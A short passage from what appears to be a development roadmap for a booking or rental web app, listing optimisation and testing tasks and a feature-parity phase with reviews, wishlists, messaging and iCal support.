- Image optimization.
- Split the giant components.
- Tests for RBAC, booking math and auth.

**Phase 4 – Feature parity**

- Reviews, total-price display, wishlists, real-time messaging, notifications, host pricing tools, iCal.
